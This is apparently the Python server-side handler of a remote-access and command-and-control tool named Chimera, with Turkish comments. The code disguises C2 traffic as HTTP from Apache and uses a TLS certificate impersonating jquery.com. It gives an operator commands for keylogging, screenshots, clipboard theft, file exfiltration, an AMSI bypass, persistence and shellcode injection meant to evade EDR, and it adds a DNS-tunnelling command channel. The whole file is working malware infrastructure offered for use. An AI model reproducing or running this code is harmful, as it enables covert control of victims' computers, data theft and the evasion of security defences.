"""
Chimera Multi-Handler Class
Mevcut exploit/multi/handler mimarisine uygun özel handler sınıfı.
Gelecekteki C2 (AES-256-GCM / ECDH) protokolüne hazırlık içerir.
"""
from core.handler import BaseHandler
from core.shared_state import shared_state
import socket
import threading
import struct
import time
import ssl
import os
import subprocess
import base64
import sys
from datetime import datetime
from rich import print
from typing import Dict, Any, Tuple

# Sertifika dosyaları için yollar
CERT_FILE = "server.crt"
KEY_FILE = "server.key"

class Handler(BaseHandler):
    """
    Chimera Agent için özel handler sınıfı.
    """
    def __init__(self, options: Dict[str, Any]):
        super().__init__(options)
        self.session_id = None
        self.cert_file = os.path.abspath(options.get("CERT_FILE", CERT_FILE))
        self.key_file = os.path.abspath(options.get("KEY_FILE", KEY_FILE))
        self.check_and_generate_cert()

    def check_and_generate_cert(self):
        """SSL sertifikası yoksa oluşturur."""
        if not os.path.exists(self.cert_file) or not os.path.exists(self.key_file):
            print(f"[*] SSL Sertifikası oluşturuluyor... ({self.cert_file})")
            try:
                subprocess.check_call(
                    f'openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 '
                    f'-keyout "{self.key_file}" -out "{self.cert_file}" '
                    f'-subj "/C=US/ST=California/L=San Francisco/O=jQuery Inc/CN=jquery.com"',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print("[+] Sertifika oluşturuldu.")
            except Exception as e:
                print(f"[!] Sertifika oluşturma hatası: {e}")
                print("[!] Lütfen openssl'in yüklü olduğundan emin olun.")

    def start(self):
        """
        Soketi oluşturur, bağlar ve dinlemeye başlar. BaseHandler'dan
        farklı olarak bağlantı koptuğunda break yapmaz, ajan yeniden
        bağlanana kadar dinlemeye devam eder.
        """
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.lhost, self.lport))
            self.sock.listen(5)
            
            self.running = True
            print(f"[*] Dinleniyor: {self.lhost}:{self.lport} (Çıkmak için CTRL+C)")
            
            while self.running:
                try:
                    client_sock, client_addr = self.sock.accept()
                    print(f"[+] Bağlantı geldi: {client_addr[0]}:{client_addr[1]}")
                    
                    session_id = None
                    if shared_state.session_manager:
                        connection_info = {
                            "host": client_addr[0],
                            "port": client_addr[1],
                            "type": "Chimera"
                        }
                        session_id = shared_state.session_manager.add_session(self, connection_info)
                        print(f"[*] Oturum açıldı: Session {session_id}")

                    self.handle_connection(client_sock, session_id)
                    
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    if self.running:
                        print(f"[!] Bağlantı kabul hatası: {e}")
                        
        except KeyboardInterrupt:
            print("\n[*] Dinleyici durduruluyor...")
        except Exception as e:
            print(f"[!] Hata: {e}")
        finally:
            self.stop()

    def handle_connection(self, client_sock: socket.socket, session_id: int = None):
        """
        Yeni gelen bağlantıyı karşılar ve yönetir.
        """
        self.client_sock = client_sock
        self.session_id = session_id
        
        print(f"[*] Chimera Handler: Yeni bağlantı kabul edildi. (Session: {session_id})")

        # 1. SSL/TLS Handshake (C2 Encryption)
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
            
            # AES-256-GCM / ECDH kullanımını teşvik et
            # Modern SSL varsayılanları genellikle bunu yapar ama biz yine de belirtelim
            try:
                context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
            except Exception:
                pass # Sistem desteklemiyorsa varsayılanları kullan

            self.client_sock = context.wrap_socket(client_sock, server_side=True)
            cipher = self.client_sock.cipher()
            print(f"[*] Şifreli Bağlantı Kuruldu: {cipher[0]} ({cipher[1]} bit) - {cipher[2]}")
            
        except Exception as e:
            print(f"[!] SSL Handshake Hatası: {e}")
            return

        # 2. Ajan Kimlik Doğrulaması / Sistem Bilgisi Alma
        
        # 2. Ajan Kimlik Doğrulaması / Sistem Bilgisi Alma
        try:
            # İlk mesajın sysinfo olmasını bekliyoruz
            sysinfo = self.recv_data()
            if sysinfo:
                print(f"[+] Ajan Bilgisi: {sysinfo}")
                
                # Session manager'daki bilgiyi güncelle (Opsiyonel)
                if shared_state.session_manager and self.session_id:
                     session = shared_state.session_manager.get_session(self.session_id)
                     if session:
                         # Extra info olarak ekle
                         session["info"]["extra"] = sysinfo
                         # Session tipini güncelle
                         session["type"] = "Chimera"

        except Exception as e:
            print(f"[!] Handshake hatası: {e}")
            return

        # 3. Arka plan / Ön plan etkileşimi
        # MultiHandler her zaman thread açar ve (gerekirse) main thread'den 'interact' çağrısı yapar.
        # Biz burada sadece soket bağlantısını tutmakla yükümlüyüz.
        background = str(self.options.get("BACKGROUND", "false")).lower() in ['true', '1', 'yes', 'y']
        
        if background:
            session_pid = None
            if self.session_id and shared_state.session_manager:
                session = shared_state.session_manager.get_session(self.session_id)
                # Session içindeki sysinfo'dan PID'yi parse etmeye çalışabiliriz, veya ekrana sadece Thread/Session ID basabiliriz
                print(f"[*] Chimera Session {self.session_id} arka planda açıldı. (PID: {threading.get_ident()})")
            else:
                print(f"[*] Chimera Session {self.session_id} arka planda açıldı. (PID: {threading.get_ident()})")
            print(f"[*] Etkileşim için 'sessions -i {self.session_id}' kullanın.\n")

            
        # Soket kapanmasın diye bekle
        try:
            while getattr(self, "running", True) and self.client_sock:
                time.sleep(1)
        except:
            pass

    def interact(self, session_id: int):
        """
        Oturumla etkileşime geçen (Interactive Shell) metod.
        'sessions -i ID' komutuyla çağrılır.
        """
        self.interactive_session()


    def send_data(self, data: str):
        """HTTP Response olarak şifreli veri gönderir."""
        if not self.client_sock: return
        try:
            encoded_body = data.encode('utf-8')
            
            # HTTP Response Oluştur (Obfuscation)
            http_response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Server: Apache/2.4.41 (Ubuntu)\r\n"
                b"Date: " + time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime()).encode() + b"\r\n"
                b"Content-Type: application/javascript; charset=utf-8\r\n"
                b"Content-Length: " + str(len(encoded_body)).encode() + b"\r\n"
                b"Connection: keep-alive\r\n"
                b"\r\n"
            )
            
            self.client_sock.sendall(http_response + encoded_body)
        except Exception as e:
            print(f"[!] Veri gönderme hatası: {e}")

    def recv_data(self) -> str:
        """HTTP Request içinden veriyi okur."""
        if not self.client_sock: return ""
        try:
            # Headerları oku (\r\n\r\n bulana kadar)
            header_buffer = b""
            while b"\r\n\r\n" not in header_buffer:
                chunk = self.client_sock.recv(1)
                if not chunk: return ""
                header_buffer += chunk
            
            # Content-Length bul
            headers = header_buffer.decode('utf-8', errors='ignore')
            content_length = 0
            for line in headers.split('\r\n'):
                if line.lower().startswith('content-length:'):
                    try:
                        content_length = int(line.split(':')[1].strip())
                    except:
                        pass
            
            # Body'yi oku
            body = b""
            while len(body) < content_length:
                chunk = self.client_sock.recv(content_length - len(body))
                if not chunk: break
                body += chunk
                
            return body.decode('utf-8')
        except Exception as e:
            print(f"[!] Veri alma hatası: {e}")
            return ""

    def start_shell_mode(self, tunnel_port: int):
        """Ayrı TCP tüneli üzerinden shell etkileşimini yönetir.
        
        Agent tarafında açılan shell tüneline bağlanır, raw I/O yapar.
        Shell kapanınca sadece tünel soketi kapatılır; C2 bağlantısı korunur.
        
        Args:
            tunnel_port: Agent'ın açtığı shell tüneli port numarası.
        """
        print("-" * 50)
        print("[*] Raw Shell Moduna geçildi (Ayrı Tünel).")
        print("[*] Çıkış için 'exit' yazıp Enter'layın.")
        print("-" * 50)
        
        # ── 1. Agent'ın shell tüneline bağlan ──────────────────────
        # Agent'ın IP adresi = mevcut C2 bağlantısındaki peer
        try:
            agent_host = self.client_sock.getpeername()[0]
        except Exception:
            agent_host = self.lhost  # Fallback

        try:
            shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell_sock.settimeout(15)
            shell_sock.connect((agent_host, tunnel_port))
            shell_sock.settimeout(None)
            print(f"[*] Shell tüneline bağlanıldı: {agent_host}:{tunnel_port}")
        except Exception as e:
            print(f"[!] Shell tüneline bağlanılamadı: {e}")
            return
        
        # ── 2. Raw I/O: shell_sock ↔ kullanıcı terminal ───────────
        stop_event = threading.Event()
        
        def recv_loop():
            """Shell Socket -> STDOUT"""
            while not stop_event.is_set():
                try:
                    if not shell_sock: break
                    data = shell_sock.recv(4096)
                    if not data:
                        stop_event.set()
                        break
                    print(data.decode('utf-8', errors='replace'), end='', flush=True)
                except Exception:
                    stop_event.set()
                    break

        t = threading.Thread(target=recv_loop, daemon=True)
        t.start()
        
        try:
            while not stop_event.is_set():
                try:
                    cmd = sys.stdin.readline()
                except EOFError:
                    break
                
                if not cmd: break
                
                if cmd.strip() == "exit":
                    try:
                        shell_sock.send(b"exit_shell_mode_now")
                    except:
                        pass
                    stop_event.set()
                    break
                
                try:
                    shell_sock.send(cmd.encode('utf-8'))
                except:
                    stop_event.set()
                    break
                
        except KeyboardInterrupt:
            try:
                shell_sock.send(b"exit_shell_mode_now")
            except:
                pass
            stop_event.set()

        # ── 3. Temizlik — sadece shell soketini kapat ─────────────
        print("\n[*] Shell modundan çıkıldı.")
        try:
            shell_sock.close()
        except:
            pass
        
        # C2 bağlantısı (self.client_sock) DOKUNULMAZ
        # Session silinmez — chimera prompt'a doğrudan dönülür


    def interactive_session(self):
        """Basit interaktif komut satırı."""
        print("-" * 50)
        print(f"[*] Chimera Session {self.session_id} aktif. Çıkmak için 'background' veya 'bg'.")
        print("-" * 50)
        
        while True:
            try:
                cmd = input(f"chimera ({self.session_id}) > ")
                if not cmd.strip(): continue
                
                # Kullanıcı yanlışlıkla kopyala-yapıştır yaparken "chimera (1) > " kısmını da alırsa temizle
                import re
                cmd = re.sub(r'^chimera\s*\(\d+\)\s*>\s*', '', cmd.strip())
                if not cmd: continue
                
                cmd_lower = cmd.lower()
                
                if cmd_lower in ["exit", "quit"]:
                    # Session'ı kapat
                    print("[*] Bağlantı kapatılıyor...")
                    self.send_data("terminate")
                    if shared_state.session_manager and self.session_id:
                        with shared_state.session_manager.lock:
                            if self.session_id in shared_state.session_manager.sessions:
                                del shared_state.session_manager.sessions[self.session_id]
                    self.session_id = None
                    break
                    
                if cmd_lower in ["background", "bg"]:
                    # Arka plana at (Session açık kalır)
                    print(f"[*] Session {self.session_id} arka plana atıldı.")
                    break
                
                # Yardım komutu
                if cmd_lower in ["help", "?"]:
                    help_text = """
╔════════════════════════════════════════════════════════════════╗
║              CHIMERA AGENT - KULLANILABILIR KOMUTLAR           ║
╚════════════════════════════════════════════════════════════════╝

[Oturum Yönetimi]
  background, bg        - Oturumu arka plana at
  exit, quit            - Ajanı sonlandır ve bağlantıyı kes

[Sistem Bilgisi]
  sysinfo               - Detaylı sistem bilgisi (OS, IP, process, yetki)
  detect                - Ortam analizi (AV/EDR ve VM/Sandbox tespiti)
  pwd                   - Mevcut dizini göster
  
[Dosya İşlemleri]
  ls [path]             - Dizin içeriğini listele
  cd <path>             - Dizin değiştir
  mkdir <path>          - Klasör oluştur
  rm <path>             - Dosya/klasör sil
  upload <local> [remote] - Dosya yükle
  download <remote>     - Dosya indir

[Gözetleme]
  screenshot            - Anlık ekran görüntüsü al (RAM üzerinden)
  keylogger_start       - Keylogger başlat (Windows)
  keylogger_stop        - Keylogger durdur
  keylogger_dump        - Tuş kayıtlarını getir ve kaydet
  clipboard_get         - Pano içeriğini oku
  clipboard_set <text>  - Pano içeriğini değiştir

[Komut Çalıştırma]
  shell                 - İnteraktif shell başlat
  <komut>               - Sistem komutu çalıştır (örn: whoami, ipconfig)

[Modül Yönetimi]
  loadmodule <file>     - Python modülünü hafızaya yükle
  runmodule <name> [func] - Yüklü modülü çalıştır
  listmodules           - Yüklü modülleri listele

[Evasion & Persistence]
  amsi_bypass           - Windows AMSI korumasını bellekte patchle (Bypass)
  persistence_install   - Ajanı sistem başlangıcına ekle (Kalıcılık)
  persistence_remove    - Kalıcılık ayarlarını temizle

[Process Injection / Migration]
  inject_list                         - Enjeksiyona uygun process'leri listele
  inject_shellcode <PID> <file>       - Shellcode dosyasını hedef PID'e enjekte et
  inject_shellcode_nt <PID> <file>    - NtCreateThreadEx ile enjeksiyon (EDR atlatma)
  inject_migrate <PID> [file]         - Hedef process'e migrate et (opsiyonel shellcode)

[Port Forwarding (Tünelleme)]
  portfwd add <port> <host> <port>    - Yeni port forwarding tüneli başlat
  portfwd list                        - Aktif tünelleri listele
  portfwd del <id>                    - Tüneli kaldır
  portfwd stop                        - Tüm tünelleri durdur

[Network Scanner (Ağ Tarama)]
  netscan sweep <CIDR> [timeout]      - Ping sweep (host keşfi)
  netscan arp [CIDR]                  - ARP tablosu taraması (Layer 2)
  netscan ports <HOST> [aralık]       - TCP port taraması (ör: 1-1024, 22,80,443)

═══════════════════════════════════════════════════════════════════
"""
                    print(help_text)
                    continue

                # Modül Yükleme: Yerel Python dosyasını uzak ajanın belleğine yükle
                if cmd_lower.startswith("loadmodule "):
                    try:
                        parts = cmd.split(" ", 1)
                        if len(parts) < 2:
                            print("[!] Kullanım: loadmodule <local_file_path>")
                            continue
                        
                        file_path = parts[1].strip()
                        if not os.path.exists(file_path):
                            print(f"[!] Dosya bulunamadı: {file_path}")
                            continue
                        
                        # Dosyayı oku ve encode et
                        with open(file_path, "rb") as f:
                            file_content = f.read()
                            b64_content = base64.b64encode(file_content).decode('utf-8')
                        
                        # Dosya adından modül adı türet (uzantısız)
                        filename = os.path.basename(file_path)
                        module_name = os.path.splitext(filename)[0]
                        
                        # Yeni komutu hazırla
                        print(f"[*] Modül gönderiliyor: {module_name} ({len(file_content)} bytes)")
                        cmd = f"loadmodule {module_name} {b64_content}"
                        
                    except Exception as e:
                        print(f"[!] Modül hazırlama hatası: {str(e)}")
                        continue

                # Process Injection: Shellcode dosyasını oku ve enjekte et
                # Kullanım: inject_shellcode <PID> <local_shellcode_file>
                if cmd_lower.startswith("inject_shellcode ") or cmd_lower.startswith("inject_shellcode_nt "):
                    try:
                        use_nt = cmd_lower.startswith("inject_shellcode_nt ")
                        prefix = "inject_shellcode_nt " if use_nt else "inject_shellcode "
                        rest   = cmd[len(prefix):].strip().split(None, 1)

                        if len(rest) < 2:
                            print(f"[!] Kullanım: {prefix.strip()} <PID> <local_shellcode_file>")
                            continue

                        target_pid    = rest[0]
                        sc_file_path  = rest[1].strip()

                        if not os.path.exists(sc_file_path):
                            print(f"[!] Shellcode dosyası bulunamadı: {sc_file_path}")
                            continue

                        with open(sc_file_path, "rb") as _f:
                            sc_bytes = _f.read()

                        b64_sc = base64.b64encode(sc_bytes).decode("utf-8")
                        print(f"[*] Shellcode yükleniyor: {sc_file_path} ({len(sc_bytes)} bytes) → PID {target_pid}")

                        nt_prefix = "nt:" if use_nt else ""
                        cmd = f"inject_shellcode_b64 {target_pid} {nt_prefix}{b64_sc}"

                    except Exception as e:
                        print(f"[!] Inject hazırlık hatası: {str(e)}")
                        continue

                # inject_migrate <PID> [local_shellcode_file]
                if cmd_lower.startswith("inject_migrate "):
                    try:
                        rest = cmd[len("inject_migrate "):].strip().split(None, 1)

                        if not rest:
                            print("[!] Kullanım: inject_migrate <PID> [local_shellcode_file]")
                            continue

                        target_pid = rest[0]

                        if len(rest) == 2:
                            sc_file_path = rest[1].strip()
                            if not os.path.exists(sc_file_path):
                                print(f"[!] Shellcode dosyası bulunamadı: {sc_file_path}")
                                continue

                            with open(sc_file_path, "rb") as _f:
                                sc_bytes = _f.read()

                            b64_sc = base64.b64encode(sc_bytes).decode("utf-8")
                            print(f"[*] Migration shellcode hazırlanıyor: {sc_file_path} ({len(sc_bytes)} bytes) → PID {target_pid}")
                            cmd = f"inject_migrate {target_pid} {b64_sc}"
                        else:
                            cmd = f"inject_migrate {target_pid}"

                    except Exception as e:
                        print(f"[!] inject_migrate hazırlık hatası: {str(e)}")
                        continue

                # Dosya Yükleme: Yerel dosyayı uzak sisteme transfer et
                if cmd_lower.startswith("upload "):
                    try:
                        parts = cmd.split(" ", 2)
                        if len(parts) < 2:
                            print("[!] Kullanım: upload <local_path> [remote_path]")
                            continue
                        
                        local_path = parts[1]
                        remote_path = parts[2] if len(parts) > 2 else os.path.basename(local_path)
                        
                        if not os.path.exists(local_path):
                            print(f"[!] Dosya bulunamadı: {local_path}")
                            continue
                            
                        with open(local_path, "rb") as f:
                            file_content = f.read()
                            b64_content = base64.b64encode(file_content).decode('utf-8')
                            
                        print(f"[*] Dosya yükleniyor: {local_path} -> {remote_path} ({len(file_content)} bytes)")
                        cmd = f"upload {remote_path} {b64_content}"
                        
                    except Exception as e:
                        print(f"[!] Upload hazırlık hatası: {str(e)}")
                        continue

                # Port Forwarding işlemleri (Handler yakalar ve ajana gönderir)
                if cmd_lower.startswith("portfwd "):
                    if len(cmd_lower.split()) < 2:
                        print("[!] Kullanım: portfwd <add|list|del|stop>")
                        continue
                    # Ajan tarafında çalışması için sadece yönlendir
                    self.send_data(cmd)
                    response = self.recv_data()
                    print(response)
                    continue

                # Network Scanner işlemleri (Ajan tarafında çalışır)
                if cmd_lower.startswith("netscan "):
                    if len(cmd_lower.split()) < 2:
                        print("[!] Kullanım: netscan <sweep|arp|ports|quick>")
                        continue
                    print("[*] Ağ taraması başlatıldı, lütfen bekleyin...")
                    self.send_data(cmd)
                    response = self.recv_data()
                    print(response)
                    continue

                # Komutu gönder
                self.send_data(cmd)

                # Shell Modu: İnteraktif shell oturumu başlat
                if cmd_lower == "shell":
                    # Agent artık SHELL_TUNNEL:<port> yanıtı gönderiyor
                    response = self.recv_data()
                    
                    if response and response.startswith("SHELL_TUNNEL:"):
                        try:
                            tunnel_port = int(response.split(":")[1])
                            print(f"[+] Shell oturumu başlatıldı. (Tünel port: {tunnel_port})")
                            self.start_shell_mode(tunnel_port)
                            # Shell modundan dönünce C2 bağlantısı hâlâ ayakta
                            # Doğrudan chimera prompt'a dön
                        except (ValueError, IndexError) as e:
                            print(f"[!] Shell tünel portu parse hatası: {e}")
                    elif response:
                        print(response)  # Hata mesajı
                    else:
                        print("[!] Shell başlatma yanıtı alınamadı.")
                    continue
                
                # Normal komut cevabı bekle
                response = self.recv_data()
                if response:
                    # Dosya İndirme: İndirilen dosyayı yerel sisteme kaydet
                    if response.startswith("DOWNLOAD_OK:"):
                        try:
                            # Format: DOWNLOAD_OK:<base64>
                            b64_data = response.split(":", 1)[1]
                            file_content = base64.b64decode(b64_data)
                            
                            # Dosya adını komuttan çıkarmaya çalış
                            # Orijinal komut: download <remote_path>
                            # Biz burada orijinal 'cmd' değişkenini kullanıyoruz ama 'cmd' overwrite edilmiş olabilir mi?
                            # Hayır, 'download' komutu upload bloğuna girmediği için 'cmd' orijinal halinde.
                            
                            parts = cmd.split(" ")
                            if len(parts) >= 2:
                                filename = os.path.basename(parts[1])
                            else:
                                filename = f"downloaded_{int(time.time())}.bin"
                                
                            # Varsa download klasörüne kaydet, yoksa current dir
                            save_path = os.path.join(os.getcwd(), filename)
                            
                            with open(save_path, "wb") as f:
                                f.write(file_content)
                                
                            print(f"[+] Dosya başarıyla indirildi: {save_path} ({len(file_content)} bytes)")
                        except Exception as e:
                            print(f"[!] Download kaydetme hatası: {str(e)}")
                    
                    # Ekran Görüntüsü: Gelen screenshot verisini dosyaya kaydet
                    elif response.startswith("SCREENSHOT_OK:"):
                        try:
                            b64_data = response.split(":", 1)[1]
                            img_data = base64.b64decode(b64_data)
                            
                            # screenshots klasörünü oluştur
                            screenshots_dir = os.path.join(os.getcwd(), "screenshots")
                            os.makedirs(screenshots_dir, exist_ok=True)
                            
                            # Dosya formatını belirle (BMP veya PNG)
                            if img_data[:2] == b'BM':
                                ext = "bmp"
                            else:
                                ext = "png"
                            
                            # Timestamp ile dosya adı oluştur
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            filename = f"screenshot_{timestamp}_session{self.session_id}.{ext}"
                            save_path = os.path.join(screenshots_dir, filename)
                            
                            with open(save_path, "wb") as f:
                                f.write(img_data)
                            
                            # Dosya boyutunu insan okunabilir formata çevir
                            size_kb = len(img_data) / 1024
                            if size_kb > 1024:
                                size_str = f"{size_kb/1024:.2f} MB"
                            else:
                                size_str = f"{size_kb:.2f} KB"
                            
                            print(f"[+] 📸 Ekran görüntüsü kaydedildi!")
                            print(f"    Dosya : {save_path}")
                            print(f"    Boyut : {size_str}")
                            print(f"    Format: {ext.upper()}")
                        except Exception as e:
                            print(f"[!] Screenshot kaydetme hatası: {str(e)}")

                    # Keylogger Dökümü: Gelen logları kaydet
                    elif response.startswith("KEYLOG_DUMP:"):
                        try:
                            b64_logs = response.split(":", 1)[1]
                            logs = base64.b64decode(b64_logs).decode('utf-8')
                            
                            # logs klasörünü oluştur
                            logs_dir = os.path.join(os.getcwd(), "logs")
                            os.makedirs(logs_dir, exist_ok=True)
                            
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            filename = f"keylog_{timestamp}_session{self.session_id}.txt"
                            save_path = os.path.join(logs_dir, filename)
                            
                            with open(save_path, "w", encoding="utf-8") as f:
                                f.write(logs)
                                
                            print(f"[+] ⌨️ Keylogger dökümü alındı!")
                            print(f"    Dosya : {save_path}")
                            print(f"    Boyut : {len(logs)} karakter")
                            print("-" * 40)
                            # Ekrana da bas (kısaca)
                            lines = logs.split('\n')
                            print("\n".join(lines[:10])) # İlk 10 satırı göster
                            if len(lines) > 10:
                                print(f"... (toplam {len(lines)} satır)")
                            print("-" * 40)
                                
                        except Exception as e:
                            print(f"[!] Keylog kaydetme hatası: {str(e)}")

                    # Clipboard Verisi: Pano içeriğini göster
                    elif response.startswith("CLIPBOARD_DATA:"):
                        try:
                            b64_content = response.split(":", 1)[1]
                            content = base64.b64decode(b64_content).decode('utf-8')
                            
                            print("-" * 40)
                            print("[+] 📋 Pano İçeriği:")
                            print("-" * 40)
                            print(content)
                            print("-" * 40)
                        except Exception as e:
                            print(f"[!] Pano verisi okuma hatası: {str(e)}")
                            
                    else:
                        print(response)
                else:
                    print("[!] Bağlantı koptu.")
                    if shared_state.session_manager and self.session_id:
                        with shared_state.session_manager.lock:
                            if self.session_id in shared_state.session_manager.sessions:
                                del shared_state.session_manager.sessions[self.session_id]
                    self.session_id = None
                    break
                    
            except KeyboardInterrupt:
                print("\n[*] Interaktif moddan çıkılıyor (Ctrl+C).")
                break
            except Exception as e:
                print(f"[!] Hata: {e}")
                break


# ============================================================
# DNS Tünel Handler
# ============================================================

class DNSChannelHandler:
    """DNS tünelleme iletişim kanalı handler'ı.
    
    Agent'ın DNS sorguları üzerinden gönderdiği verileri alır
    ve DNS TXT kayıtları ile komut gönderir.
    
    UDP port 53 üzerinde dinler (root yetkisi gerekebilir).
    
    Args:
        options: Handler seçenekleri (LHOST, DNS_PORT vb.)
    """

    def __init__(self, options: Dict[str, Any]):
        self.lhost = options.get("LHOST", "0.0.0.0")
        self.dns_port = int(options.get("DNS_PORT", 53))
        self.running = False
        self.sock = None
        self._sessions = {}      # session_hash -> {"addr", "data_buffer", "pending_cmd"}
        self._pending_response = None
        self._lock = threading.Lock()

    def _build_dns_response(self, query_data: bytes, txt_value: str) -> bytes:
        """DNS TXT cevap paketi oluşturur.
        
        Args:
            query_data: Orijinal DNS sorgu paketi (header + question kopyalanır).
            txt_value: TXT kaydına yazılacak değer.
            
        Returns:
            bytes: DNS cevap paketi.
        """
        if len(query_data) < 12:
            return b""

        # Transaction ID'yi koru, flags = response + authoritative
        txn_id = query_data[:2]
        flags = struct.pack('>H', 0x8400)  # QR=1, AA=1

        # Question section'ı bul
        pos = 12
        while pos < len(query_data) and query_data[pos] != 0:
            label_len = query_data[pos]
            if label_len & 0xC0 == 0xC0:
                pos += 2
                break
            pos += 1 + label_len
        else:
            pos += 1
        pos += 4  # QTYPE + QCLASS

        question_section = query_data[12:pos]

        # Header: QDCOUNT=1, ANCOUNT=1
        header = txn_id + flags + struct.pack('>HHHH', 1, 1, 0, 0)

        # Answer: pointer to question name + TXT record
        txt_bytes = txt_value.encode('utf-8')
        answer = (
            b'\xc0\x0c'               # Name pointer to question
            + struct.pack('>HH', 16, 1)  # TYPE=TXT, CLASS=IN
            + struct.pack('>I', 60)      # TTL=60
            + struct.pack('>H', len(txt_bytes) + 1)  # RDLENGTH
            + struct.pack('B', len(txt_bytes))         # TXT length byte
            + txt_bytes
        )

        return header + question_section + answer

    def _parse_query_name(self, data: bytes) -> str:
        """DNS sorgu paketinden domain adını çıkarır."""
        if len(data) < 13:
            return ""
        pos = 12
        labels = []
        while pos < len(data) and data[pos] != 0:
            label_len = data[pos]
            if label_len & 0xC0 == 0xC0:
                break
            pos += 1
            labels.append(data[pos:pos + label_len].decode('ascii', errors='ignore'))
            pos += label_len
        return '.'.join(labels)

    def start(self):
        """DNS handler'ı başlatır (UDP port 53)."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.lhost, self.dns_port))
            self.sock.settimeout(1.0)
            self.running = True

            print(f"[*] DNS Handler dinleniyor: {self.lhost}:{self.dns_port}")

            while self.running:
                try:
                    data, addr = self.sock.recvfrom(4096)
                    if not data:
                        continue

                    qname = self._parse_query_name(data)
                    if not qname:
                        continue

                    # Kayıt sorgusu: reg.<hash>.<domain>
                    if qname.startswith("reg."):
                        response = self._build_dns_response(data, "OK")
                        self.sock.sendto(response, addr)
                        parts = qname.split('.')
                        if len(parts) >= 3:
                            session_hash = parts[1]
                            with self._lock:
                                self._sessions[session_hash] = {
                                    "addr": addr,
                                    "data_buffer": {},
                                    "pending_cmd": None
                                }
                            print(f"[+] DNS Agent kaydı: {session_hash} ({addr[0]}:{addr[1]})")

                    # Polling sorgusu: poll.<domain>
                    elif qname.startswith("poll."):
                        response_txt = "END"
                        with self._lock:
                            if self._pending_response:
                                import base64
                                encoded = base64.b64encode(
                                    self._pending_response.encode('utf-8')
                                ).decode('utf-8')
                                response_txt = f"COMPLETE:{encoded}"
                                self._pending_response = None

                        response = self._build_dns_response(data, response_txt)
                        self.sock.sendto(response, addr)

                    # Veri sorgusu: <encoded>.<seq_info>.<domain>
                    elif any(qname.split('.')[-2].startswith('s') and 't' in qname.split('.')[-2] for _ in [1] if len(qname.split('.')) >= 3):
                        parts = qname.split('.')
                        # seq_info parsing: s<idx>t<total>
                        seq_info = parts[-2] if len(parts) >= 3 else ""
                        try:
                            s_pos = seq_info.index('s')
                            t_pos = seq_info.index('t')
                            seq_idx = int(seq_info[s_pos+1:t_pos])
                            seq_total = int(seq_info[t_pos+1:])

                            # Data labels (seq ve domain hariç)
                            data_labels = '.'.join(parts[:-2])

                            with self._lock:
                                for session in self._sessions.values():
                                    if session["addr"] == addr or True:
                                        session["data_buffer"][seq_idx] = data_labels
                                        # Tüm parçalar geldiyse birleştir
                                        if len(session["data_buffer"]) == seq_total:
                                            import base64
                                            full_encoded = ''.join(
                                                session["data_buffer"][i]
                                                for i in range(seq_total)
                                            )
                                            try:
                                                padding = (8 - len(full_encoded) % 8) % 8
                                                decoded = base64.b32decode(
                                                    full_encoded.upper() + '=' * padding
                                                ).decode('utf-8')
                                                print(f"[+] DNS Veri alındı: {decoded[:80]}...")
                                            except Exception:
                                                pass
                                            session["data_buffer"] = {}
                                        break
                        except (ValueError, IndexError):
                            pass

                        # ACK gönder
                        response = self._build_dns_response(data, "OK")
                        self.sock.sendto(response, addr)

                    else:
                        # Bilinmeyen sorgu — boş cevap
                        response = self._build_dns_response(data, "")
                        self.sock.sendto(response, addr)

                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[!] DNS Handler hatası: {e}")

        except PermissionError:
            print("[!] DNS Handler: Port 53 için root/admin yetkisi gerekiyor.")
            print("[*] İpucu: sudo ile çalıştırın veya DNS_PORT değerini değiştirin.")
        except Exception as e:
            print(f"[!] DNS Handler başlatma hatası: {e}")
        finally:
            self.stop()

    def send_command(self, command: str):
        """Agent'a gönderilecek komutu kuyruğa ekler.
        
        Komut, agent'ın bir sonraki poll sorgusunda TXT kaydı olarak döner.
        """
        with self._lock:
            self._pending_response = command

    def stop(self):
        """DNS Handler'ı durdurur."""
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
